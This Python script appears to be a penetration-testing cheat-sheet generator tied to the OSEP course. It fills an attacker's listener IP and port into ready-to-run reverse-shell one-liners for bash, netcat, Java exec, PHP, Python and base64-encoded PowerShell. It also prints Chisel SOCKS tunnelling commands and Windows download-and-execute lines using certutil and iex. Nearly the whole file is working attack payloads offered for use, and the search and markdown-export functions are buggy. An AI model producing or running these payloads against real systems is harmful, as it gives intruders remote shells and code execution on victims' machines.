import socket
import sys
import re
import fcntl
import struct
import json
import argparse
import base64
import os

def get_ip_address_by_inet_name(network_interface):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', network_interface[:15])
    )[20:24])

shell_template = {
    "Bash": {
        "bash-1": {
            "description": "bash -i",
            "template": "bash -i >& /dev/tcp/{{ip}}/{{port}} 0>&1 2>&1"
        },
        "bash-2": {
            "description": "bash tcp",
            "template": "/bin/bash -l > /dev/tcp/{{ip}}/{{port}} 0<&1 2>&1"
        }
    },
    "NC": {
        "nc-1": {
            "description": "nc -e",
            "template": "nc -e /bin/sh {{ip}} {{port}} 2>&1"
        },
        "nc-2": {
            "description": "nc without -e",
            "template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{ip}} {{port}} >/tmp/f"
        }
    },
    "Bash in JAVA Runtime.getRuntime().exec()": {
        "bash-in-java-1-linux": {
            "description": "Method 1: Linux: Bash in JAVA Runtime.getRuntime().exec()",
            "template": "bash -c {echo,BASE64(bash -i >\\& /dev/tcp/{{ip}}/{{port}} 0>&1)}|{base64,-d}|{bash,-i}"
        },
        "bash-in-java-1-mac": {
            "description": "Method 1: Mac: Bash in JAVA Runtime.getRuntime().exec()",
            "template": "bash -c {echo,BASE64(bash -i >& /dev/tcp/{{ip}}/{{port}} 0>&1)}|{base64,-D}|{bash,-i}"
        },
        "bash-in-java-2": {
            "description": "Method 2: Bash in JAVA Runtime.getRuntime().exec()",
            "template": "bash -c bash${IFS}-i${IFS}>&/dev/tcp/{{ip}}/{{port}}<&1"
        },
        "bash-in-java-3": {
            "description": "Method 3: Bash in JAVA Runtime.getRuntime().exec()",
            "template": "bash -c $@|bash 0 echo bash -i >& /dev/tcp/{{ip}}/{{port}} 0>&1"
        }
    },
    "bash-in-php-system": {
        "bash-in-php-system": {
            "description": "Bash in PHP system()",
            "template": "bash -c \"bash -i >& /dev/tcp/{{ip}}/{{port}} 0>&1\""
        }
    },
    "Python": {
        "python2-1": {
            "description": "Python2 reverse shell",
            "template": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{ip}}\",{{port}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' "
        },
        "python3-1": {
            "description": "Python3 reverse shell",
            "template": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{ip}}\",{{port}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")' "
        }
    },
    "PHP": {
        "php-1": {
            "description": "PHP system",
            "template": "php -r '$sock=fsockopen(\"{{ip}}\",{{port}});system(\"sh <&3 >&3 2>&3\");' "
        }
    },
    "Powershell": {
        "powershell-1": {
            "description": "PowerShell",
            "pre-process": "powershell_base64",
            "prefix": "powershell -e ",
            "template": "$client = New-Object System.Net.Sockets.TCPClient(\"{{ip}}\",{{port}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        },
        "powershell-2": {
            "description": "PowerShell",
            "prefix": "",
            "template": "$client = New-Object System.Net.Sockets.TCPClient(\"{{ip}}\",{{port}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        }
    },
    "Spawn TTY": {
        "spawning-tty-bash": {
            "description": "Spawning Shells with Python",
            "template": "python -c 'import pty; pty.spawn(\"/bin/bash\")' "
        },
        "spawning-tty-sh": {
            "description": "Spawning Shells with Python",
            "template": "python -c 'import pty; pty.spawn(\"/bin/sh\")' "
        }
    },
    "Chisel": {
        "chisel-server-reverse": {
            "description": "Chisel server (server on local machine)",
            "template": "sudo ./chisel server -p {{port}} --reverse --socks5"
        },
        "chisel-client-reverse": {
            "description": "Chisel clietn (client on remote machine)",
            "template": ".\\chisel.exe client {{ip}}:{{port}} R:socks"
        },
        "chisel-server": {
            "description": "Chisel server (server on remote machine)",
            "template": "./chisel server -p 8000 --socks5"
        },
        "chisel-client": {
            "description": "Chisel clietn (client on local machine)",
            "template": ".\\chisel.exe client {{ip}}:{{port}} 0.0.0.0:1080:socks"
        }
    },
    "Windows Download File": {
        "windows-download-certutil": {
            "description": "Download files with certutil.exe",
            "template": "certutil.exe -urlcache -f http://{{ip}}:{{port}}/{{filename}} {{filename}}"
        },
        "windows-download-powershell-iwr": {
            "description": "Download files with powershell",
            "template": "iwr \"http://{{ip}}:{{port}}/{{filename}}\" -OutFile \"{{filename}}\""
        },
        "windows-download-and-exec-powershell": {
            "description": "Download files with powershell",
            "template": "powershell 'iex(iWr -UsEbaSIcparSING http://{{ip}}:{{port}}/{{filename}});'"
        }
    }
}

def gen_shell(template):
    global ip
    global port
    global filename
    payload = template['template'].replace('{{ip}}', ip).replace('{{port}}', port).replace('{{filename}}', filename)

    if 'pre-process' in template:
        func = getattr(MyEncoder, template['pre-process'])
        payload = func(payload)

    if 'prefix' in template:
        payload = template['prefix'] + payload

    return payload

def print_template(template): 
    print('[*] ' + template['description'])
    print(gen_shell(template))
    print('')

def print_title(s):
    title_len = len(s) + 10

    print('=' * title_len)
    space = ' ' * (int((title_len)/2 - (len(s)/2)) - 1)
    print('=' + space + s + space + '=')
    print('=' * title_len)

class MyEncoder:
    @staticmethod
    def powershell_base64(s):
        return base64.b64encode(s.encode('utf16')[2:]).decode()

def gen_arsenal_md():
    title = '''# mycheat
% Reverseshell, osep, pen-300
#plateform/multiple #target/remote #OSEP\n'''
    md_file = os.path.join(os.path.expanduser('~'), '.cheats', 'reverseshell.md')
    with open(md_file, 'w') as f:
        f.write(title)

        for key in shell_template:
            title = '## %s\n' % shell_template[key]['description']
            content = '```\n'
            content += gen_shell(key) + '\n'
            content += '```\n\n'
            f.write(title + content)

parser = argparse.ArgumentParser()
parser.add_argument("ip", help="Listener's ip or network interface")
parser.add_argument("port", help="Listener's port")
parser.add_argument("-s", "--search", default=None, help="Search target command")
parser.add_argument("-f", "--filename", default='shell.exe', help="The file on Kali web server")
args = parser.parse_args()

ip = args.ip
port = args.port
search = args.search
filename = args.filename
if not re.findall('[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}', ip):
    ip = get_ip_address_by_inet_name(ip.encode('utf-8'))


if search is not None:
    for key in shell_template:
        if search.lower() in key:
            print_template(key)
    sys.exit(0)



for title in shell_template:
    print_title(title)
    for payload in shell_template[title]:
        print_template(shell_template[title][payload])
# gen_arsenal_md()

